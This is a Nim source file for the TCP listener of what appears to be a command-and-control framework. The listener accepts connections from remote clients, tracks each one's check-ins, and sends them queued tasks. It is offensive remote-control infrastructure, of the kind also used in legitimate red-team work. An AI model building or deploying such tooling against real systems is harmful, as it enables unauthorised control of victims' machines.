import std/[
  asyncdispatch, 
  asyncnet, 
  asyncfutures, 
  strutils,  
  times
]

import uuid4, tlv

import ../types, ../logging, ../processMessage, ../tasks

type 
  TCPSocket* = ref object
    socket*: AsyncSocket
    tcpListener*: TCPListener
    netAddr*: string
    id*: string

  TCPListener* = ref object
    socket*: AsyncSocket
    port*: int
    listeningIP*: string
    id*: int
    sockets*: seq[TCPSocket]
    running*: bool
    listenerInstance: ListenerInstance

proc `$`*(tcpListener: TCPListener): string =
  "TCP:" & $tcpListener.id & " (" & $tcpListener.listeningIP & ":" & $tcpListener.port & ")"

proc `@`*(tcpListener: TCPListener): string =
  $tcpListener

proc processMessages(server: C2Server, tcpListener: TCPListener, tcpSocket: TCPSocket, client: ref C2Client) {.async.} =
  var line: string
  let p = initParser()

  while not tcpSocket.socket.isClosed:
    try: 
      var int32bytes = cast[seq[byte]](await tcpSocket.socket.recv(4))
      p.setBuffer(int32bytes)
      let size = p.extractInt32()
      if size != 0:
        line = await tcpSocket.socket.recv(size)
    except OSError: discard
    except IndexDefect:
      client.connected = false
      tcpSocket.socket.close()
      break

    if line == "tasksplz":
      client.lastCheckin = now()

      var tasks: seq[Task]
      
      for task in server.tasks:
        if task.status == TaskCreated and task.client == client[]:
          task.status = TaskNotCompleted
          tasks.add task

      let b = initBuilder()
      b.addInt32(cast[int32](len tasks))
      for task in tasks: b.addString(task.toTLV())

      try:
        let c = initBuilder()
        c.addString(b.encodeString())
        await tcpSocket.socket.send(c.encodeString())
      except OSError: discard
      
    else: discard processMessage(client, tcpListener.listenerInstance, line)

proc createNewTcpListener*(server: C2Server, instance: ListenerInstance) {.async.} =
  let id = 1
  let ipAddress = instance.ipAddress
  let port = instance.port
  # let config = instance.config

  let tcpServer = TCPListener(
      sockets: @[], 
      port: int port,
      listeningIP: ipAddress,
      id: id, 
      socket: newAsyncSocket(),
      running: true,
      listenerInstance: instance
    )
  try:
    tcpServer.socket.setSockOpt(OptReuseAddr, true)
    tcpServer.socket.bindAddr(port, ipAddress)
    tcpServer.socket.listen()
  except OSError:
    errorLog getCurrentExceptionMsg()
    return
  
  proc stop() =
    for socket in tcpServer.sockets:
      socket.socket.close()
    # tcpServer.running = false
    # tcpServer.socket.close()
  instance.stopProc = stop

  # server.tcpListeners.add(tcpServer)
  infoLog "listening on " & tcpServer.listeningIP & ":" & $tcpServer.port & " using a tcp socket"
  
  while tcpServer.running:
    let 
      (netAddr, clientSocket) = await tcpServer.socket.acceptAddr()
      uuid = $uuid4()
      client = C2Client(
        id: uuid.split("-")[0],
        connected: true,
        loaded: false,
        isAdmin: false,
        hostname: "placeholder",
        username: "placeholder",
        server: server,
        ipAddress: netAddr,
        lastCheckin: now()
      )
      tcpSocket = TCPSocket(
        socket: clientSocket,
        id: client.id,
        netAddr: netAddr,
        tcpListener: tcpServer
      )

    var cRef = new(ref C2Client)
    cRef[] = client

    server.clients.add(client)
    tcpServer.sockets.add(tcpSocket)

    asyncCheck processMessages(server, tcpServer, tcpSocket, cRef)

  infoLog $tcpServer & " stopped"

let listener* = Listener(
  name: "tcp",
  startProc: createNewTcpListener
)